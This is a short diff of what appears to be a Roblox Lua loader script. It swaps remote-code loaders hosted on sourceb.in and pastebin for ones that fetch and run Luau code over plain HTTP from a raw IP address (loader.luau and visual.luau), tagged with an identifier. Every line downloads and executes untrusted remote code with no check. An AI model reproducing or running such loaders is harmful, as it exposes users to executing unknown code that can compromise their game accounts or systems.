@@ -1,2 +1,4 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ID3iu6wEZA/0", true))()
-loadstring(game:HttpGet("https://pastebin.com/raw/V8xxRssD"))()
+ID="908cc94e-c68f-4949-9119-3f128187492a";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
